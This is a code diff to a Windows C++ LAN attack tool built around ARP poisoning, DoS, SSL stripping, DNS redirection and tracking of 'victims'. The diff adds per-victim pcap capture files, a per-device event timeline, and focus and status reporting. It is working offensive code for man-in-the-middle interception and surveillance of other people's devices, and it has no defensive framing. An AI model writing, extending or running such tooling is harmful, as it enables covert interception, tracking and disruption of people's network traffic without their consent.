@@ -41,9 +41,11 @@
 
 static const char* OUTDIR           = "atk";
 static const char* TRACK_DIR        = "atk\\tracks";
+static const char* CAP_DIR          = "atk\\captures";
 static const char* RULES_FILE       = "atk\\rules.txt";
 static const char* APP_VERSION      = "v4";
 static const size_t RECENT_CAP      = 300;
+static const unsigned long long PCAP_MAX_BYTES = 32ull * 1024ull * 1024ull;
 static const DWORD  DNS_TTL_MS      = 10 * 60 * 1000;
 static const DWORD  CONN_IDLE_MS    = 120000;
 static const DWORD  ARP_REPOISON_MS = 4000;
@@ -83,6 +85,9 @@ static void startAttack();
 static void startScan();
 static void startDos(const std::string& ip);
 static void poisonSelected();
+static void recordPacket(const struct pcap_pkthdr* h, const unsigned char* p);
+static void closeAllCaptures();
+static void cmdDetail(const std::string& ip, int n);
 static void sendArp(pcap_t* pc, const char* srcIp, const unsigned char* srcMac,
                     const unsigned char* dstMac, const char* dstIp, int op);
 
@@ -582,10 +587,18 @@ struct Activity {
     std::deque<std::string>         recent;
     std::unordered_set<std::string> apps;
     DWORD                           lastPoison = 0;
+    FILE*                           capFile   = nullptr;
+    unsigned long long              capBytes  = 0;
+    bool                            capFull   = false;
 };
 
 static std::unordered_map<std::string, Activity> g_activity;
 static std::mutex                                g_activityMutex;
+
+// detailed traffic view: focus on one device + optional per-device pcap
+static std::string        g_focusIp;
+static std::mutex         g_focusMutex;
+static std::atomic<bool>  g_captureOn{false};
 
 static bool inActivity(const std::string& ip) {
     std::lock_guard<std::mutex> lk(g_activityMutex);
@@ -609,6 +622,103 @@ static void trackEvent(const std::string& ip, const std::string& mac,
     snprintf(path, sizeof(path), "%s\\track_%s.log", TRACK_DIR, ip.c_str());
     FILE* f = fopen(path, "a");
     if (f) { fprintf(f, "%s\n", line.c_str()); fclose(f); }
+}
+
+// ---------------------------------------------------------------
+// per-device pcap capture (atk\captures\<ip>.pcap, libpcap format)
+// ---------------------------------------------------------------
+static FILE* openCapLocked(Activity& a) {
+    if (a.capFile) return a.capFile;
+    if (a.capFull) return nullptr;
+    CreateDirectoryA(CAP_DIR, nullptr);
+    char path[MAX_PATH];
+    snprintf(path, sizeof(path), "%s\\%s.pcap", CAP_DIR, a.ip.c_str());
+    FILE* f = fopen(path, "wb");
+    if (!f) return nullptr;
+    static const unsigned char gh[24] = {
+        0xd4, 0xc3, 0xb2, 0xa1,             // magic (little endian)
+        0x02, 0x00, 0x04, 0x00,             // version 2.4
+        0x00, 0x00, 0x00, 0x00,             // thiszone
+        0x00, 0x00, 0x00, 0x00,             // sigfigs
+        0xff, 0xff, 0x00, 0x00,             // snaplen 65535
+        0x01, 0x00, 0x00, 0x00              // LINKTYPE_ETHERNET
+    };
+    if (fwrite(gh, sizeof(gh), 1, f) != 1) { fclose(f); return nullptr; }
+    a.capFile  = f;
+    a.capBytes = sizeof(gh);
+    return f;
+}
+
+static void writeCapLocked(const std::string& ip,
+                           const struct pcap_pkthdr* h,
+                           const unsigned char* p) {
+    auto it = g_activity.find(ip);
+    if (it == g_activity.end()) return;
+    Activity& a = it->second;
+    FILE* f = openCapLocked(a);
+    if (!f) return;
+    uint32_t hdr[4];
+    hdr[0] = (uint32_t)h->ts.tv_sec;
+    hdr[1] = (uint32_t)h->ts.tv_usec;
+    hdr[2] = (uint32_t)h->caplen;
+    hdr[3] = (uint32_t)h->len;
+    if (fwrite(hdr, sizeof(hdr), 1, f) != 1 ||
+        fwrite(p, 1, h->caplen, f) != h->caplen) {
+        fclose(f); a.capFile = nullptr; return;
+    }
+    a.capBytes += sizeof(hdr) + h->caplen;
+    if (a.capBytes >= PCAP_MAX_BYTES) {
+        fclose(f);
+        a.capFile = nullptr;
+        a.capFull = true;
+    }
+}
+
+static void recordPacket(const struct pcap_pkthdr* h, const unsigned char* p) {
+    if (!g_captureOn.load() || !h || !p) return;
+    if (h->caplen < 34) return;
+    if (p[12] != 0x08 || p[13] != 0x00) return;   // IPv4 only
+    const unsigned char* ip = p + 14;
+    int ihl = (ip[0] & 0x0F) * 4;
+    if (ihl < 20 || 14 + ihl > (int)h->caplen) return;
+    char src[16], dst[16];
+    snprintf(src, 16, "%u.%u.%u.%u", ip[12], ip[13], ip[14], ip[15]);
+    snprintf(dst, 16, "%u.%u.%u.%u", ip[16], ip[17], ip[18], ip[19]);
+    // never record our own machine's traffic
+    if (!g_myIp.empty() && (g_myIp == src || g_myIp == dst)) return;
+
+    // a scanned target gets a capture file even before it produces DNS/HTTP
+    auto isVictim = [](const std::string& x) {
+        std::lock_guard<std::mutex> lk(g_vmutex);
+        for (auto& v : g_victims) if (v.ip == x) return true;
+        return false;
+    };
+    bool srcKnown = isVictim(src);
+    bool dstKnown = (strcmp(src, dst) == 0) ? srcKnown : isVictim(dst);
+
+    std::lock_guard<std::mutex> lk(g_activityMutex);
+    auto ensure = [&](const char* x, bool known) -> bool {
+        if (!known) return false;
+        if (g_activity.find(x) == g_activity.end()) {
+            Activity a;
+            a.ip = x;
+            a.lastSeen = GetTickCount();
+            g_activity.emplace(x, std::move(a));
+        }
+        return true;
+    };
+    if (ensure(src, srcKnown)) writeCapLocked(src, h, p);
+    if (ensure(dst, dstKnown)) writeCapLocked(dst, h, p);
+}
+
+static void closeAllCaptures() {
+    std::lock_guard<std::mutex> lk(g_activityMutex);
+    for (auto& kv : g_activity) {
+        if (kv.second.capFile) {
+            fclose(kv.second.capFile);
+            kv.second.capFile = nullptr;
+        }
+    }
 }
 
 static void trackedAppSeen(const std::string& victimIp, const std::string& app) {
@@ -1134,6 +1244,9 @@ static void classifyPacket(const unsigned char* p, int caplen) {
     snprintf(macbuf, sizeof(macbuf), "%02X:%02X:%02X:%02X:%02X:%02X",
              p[6], p[7], p[8], p[9], p[10], p[11]);
 
+    // never treat our own machine as a tracked device
+    if (!g_myIp.empty() && g_myIp == src) return;
+
     if (proto == 17 && ihl + 8 <= (int)tot) {
         const unsigned char* udp = ip + ihl;
         int sport = (udp[0] << 8) | udp[1];
@@ -1351,11 +1464,18 @@ static void sweeperLoop() {
 
         if (now - lastPrune > 60000) {
             lastPrune = now;
+            std::string focus;
+            { std::lock_guard<std::mutex> flk(g_focusMutex); focus = g_focusIp; }
             std::lock_guard<std::mutex> lk(g_activityMutex);
             for (auto it = g_activity.begin(); it != g_activity.end(); ) {
-                if (it->second.lastSeen && now - it->second.lastSeen > ACTIVITY_TTL_MS)
+                bool idle = it->second.lastSeen &&
+                            now - it->second.lastSeen > ACTIVITY_TTL_MS;
+                if (idle && it->first != focus) {
+                    if (it->second.capFile) fclose(it->second.capFile);
                     it = g_activity.erase(it);
-                else ++it;
+                } else {
+                    ++it;
+                }
             }
         }
         Sleep(400);
@@ -2632,6 +2752,32 @@ static void cmdShowTrack(const std::string& ip, int lines) {
     for (auto& s : tail) PF("  %s\n", s.c_str());
 }
 
+static void cmdDetail(const std::string& ip, int lines) {
+    std::deque<std::string> tail;
+    long dns = 0, sni = 0, http = 0;
+    unsigned long long cap = 0;
+    bool full = false;
+    {
+        std::lock_guard<std::mutex> lk(g_activityMutex);
+        auto it = g_activity.find(ip);
+        if (it == g_activity.end()) {
+            PF("[-] no activity for %s yet\n", ip.c_str());
+            return;
+        }
+        Activity& a = it->second;
+        dns = a.dnsCount; sni = a.sniCount; http = a.httpCount;
+        cap = a.capBytes; full = a.capFull;
+        size_t start = a.recent.size() > (size_t)lines
+                     ? a.recent.size() - (size_t)lines : 0;
+        for (size_t i = start; i < a.recent.size(); ++i)
+            tail.push_back(a.recent[i]);
+    }
+    PF("  === detail %s ===\n", ip.c_str());
+    PF("  dns=%ld sni=%ld http=%ld events=%d pcap=%llu%s\n",
+       dns, sni, http, (int)tail.size(), cap, full ? " (full)" : "");
+    for (auto& s : tail) PF("  %s\n", s.c_str());
+}
+
 static void cmdTracks() {
     WIN32_FIND_DATAA fd;
     HANDLE h = FindFirstFileA("atk\\tracks\\track_*.log", &fd);
@@ -3008,6 +3154,7 @@ static BOOL WINAPI ctrlHandler(DWORD type) {
 }
 
 static void monCb(u_char*, const struct pcap_pkthdr* h, const u_char* p) {
+    recordPacket(h, p);
     if (h->caplen >= 14 && p[12] == 0x08 && p[13] == 0x06) {
         handleArp(p, h->caplen);
         return;
@@ -3160,6 +3307,9 @@ static void help() {
         "    1 intercept  2 tap  3 block  4 record  5 strip(=1)  6 dos\n"
         "  TRACKING\n"
         "    users | top [n] | tracks | watch <ip> | showtrack <ip> [n]\n"
+        "    detail <ip> [n]           live event timeline for one device\n"
+        "    _focus <ip|none>          focus a device for the GUI timeline\n"
+        "    pcap [on|off]             record per-device atk\\captures\\<ip>.pcap\n"
         "  RULES / APPS\n"
         "    block <domain> [ip|*]     redirect <domain> <ip> [ip|*]\n"
         "    unblock <domain>          rules | save | load\n"
@@ -3181,6 +3331,7 @@ int main(int argc, char** argv) {
     }
     CreateDirectoryA(OUTDIR, nullptr);
     CreateDirectoryA(TRACK_DIR, nullptr);
+    CreateDirectoryA(CAP_DIR, nullptr);
     SetConsoleOutputCP(CP_UTF8);
     SetConsoleCtrlHandler(ctrlHandler, TRUE);
 
@@ -3368,6 +3519,31 @@ int main(int argc, char** argv) {
             if (!ip.empty()) cmdShowTrack(ip, n);
             continue;
         }
+        if (line.rfind("detail ", 0) == 0) {
+            std::istringstream ss(line.substr(7));
+            std::string ip; int n = 50;
+            ss >> ip;
+            if (!(ss >> n) || n <= 0) n = 50;
+            if (!ip.empty()) cmdDetail(ip, n);
+            continue;
+        }
+        if (line.rfind("_focus ", 0) == 0) {
+            std::string ip = trim(line.substr(7));
+            if (ip == "-" || ip == "none") ip.clear();
+            { std::lock_guard<std::mutex> lk(g_focusMutex); g_focusIp = ip; }
+            PF("[+] focus %s\n", ip.empty() ? "(off)" : ip.c_str());
+            continue;
+        }
+        if (line == "pcap" || line.rfind("pcap ", 0) == 0) {
+            std::string arg = line.size() > 5 ? trim(line.substr(5)) : "";
+            bool on = (arg == "on" || arg == "1");
+            if (arg == "off" || arg == "0") on = false;
+            else if (arg.empty()) on = !g_captureOn.load();
+            g_captureOn = on;
+            if (!on) closeAllCaptures();
+            PF("[+] pcap %s\n", on ? "on" : "off");
+            continue;
+        }
         if (line.rfind("block ", 0) == 0) {
             std::istringstream ss(line.substr(6));
             std::string dom, who; ss >> dom;
@@ -3470,12 +3646,16 @@ int main(int argc, char** argv) {
             { std::lock_guard<std::mutex> lk(g_dnsRuleMutex); rules_n = (int)g_dnsRules.size(); }
             std::string ifn = g_ifName;
             for (auto& ch : ifn) if (ch == ' ') ch = '_';
-            PF("STATUS mode=%d attack=%d fwd=%d portal=%d seen=%ld arp=%ld dns=%ld kills=%ld sent=%ld tracked=%d rules=%d victims=%zu selected=%d scanning=%d myip=%s gw=%s ifname=%s\n",
+            std::string focus;
+            { std::lock_guard<std::mutex> lk(g_focusMutex); focus = g_focusIp; }
+            if (focus.empty()) focus = "-";
+            PF("STATUS mode=%d attack=%d fwd=%d portal=%d seen=%ld arp=%ld dns=%ld kills=%ld sent=%ld tracked=%d rules=%d victims=%zu selected=%d scanning=%d cap=%d focus=%s myip=%s gw=%s ifname=%s\n",
                (int)g_mode, attackOn ? 1 : 0,
                g_forwardingEnabled ? 1 : 0, g_portalActive ? 1 : 0,
                (long)g_seen, (long)g_arpReplies,
                (long)g_dnsBlocked, (long)g_kills, (long)g_sent,
                tracked, rules_n, vSnap.size(), sel, g_scanning.load() ? 1 : 0,
+               g_captureOn.load() ? 1 : 0, focus.c_str(),
                g_myIp.c_str(), g_gatewayIp.c_str(), ifn.c_str());
             {
                 std::lock_guard<std::mutex> lk(g_dnsRuleMutex);
@@ -3485,6 +3665,7 @@ int main(int argc, char** argv) {
                        r.targetIp.c_str(), r.victim.c_str());
             }
             {
+                std::string focusIp2 = (focus == "-") ? "" : focus;
                 std::lock_guard<std::mutex> lk(g_activityMutex);
                 for (auto& kv : g_activity) {
                     auto& a = kv.second;
@@ -3495,13 +3676,17 @@ int main(int argc, char** argv) {
                         for (auto& v : g_victims)
                             if (v.ip == a.ip && !v.name.empty()) { nm = v.name; break; }
                     }
-                    PF("ACTIVITY %s|%s|%ld|%ld|%ld|%lu\n",
+                    PF("ACTIVITY %s|%s|%ld|%ld|%ld|%lu|%llu|%d\n",
                        a.ip.c_str(), nm.c_str(),
-                       a.dnsCount, a.sniCount, a.httpCount, (unsigned long)age);
+                       a.dnsCount, a.sniCount, a.httpCount, (unsigned long)age,
+                       a.capBytes, a.capFull ? 1 : 0);
                     for (auto& app : a.apps)
                         PF("APP %s|%s|%d\n",
                            a.ip.c_str(), app.c_str(),
                            appBlocked(app, a.ip) ? 1 : 0);
+                    if (!focusIp2.empty() && a.ip == focusIp2)
+                        for (auto& ev : a.recent)
+                            PF("EVENT %s|%s\n", a.ip.c_str(), ev.c_str());
                 }
             }
             PF("END\n");
@@ -3533,6 +3718,7 @@ int main(int argc, char** argv) {
     writeSummary();
     if (g_pcap) pcap_breakloop(g_pcap);
     if (monitor.joinable()) monitor.join();
+    closeAllCaptures();
     if (g_pcapSend && g_pcapSend != g_pcap) pcap_close(g_pcapSend);
     if (g_pcap) pcap_close(g_pcap);
     // deliberately no WSACleanup(): resolveNames() may still have a detached
